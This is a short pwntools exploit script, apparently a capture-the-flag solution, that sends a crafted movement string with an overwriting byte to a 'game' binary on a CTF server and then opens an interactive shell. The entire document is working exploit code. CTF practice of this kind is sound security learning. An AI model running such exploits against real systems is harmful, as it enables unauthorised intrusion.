#!/usr/bin/python3

from pwn import *

exe = ELF('game', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* main+179
                b* move_player+212
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('tjc.tf', 31119)
else:
    p = process(exe.path)

GDB()
sla(b"X\n", b"l" + p8(0xe4) + b"a"*(4) + b"w" * 3 + b"a" * 24 + b"w")

p.interactive()
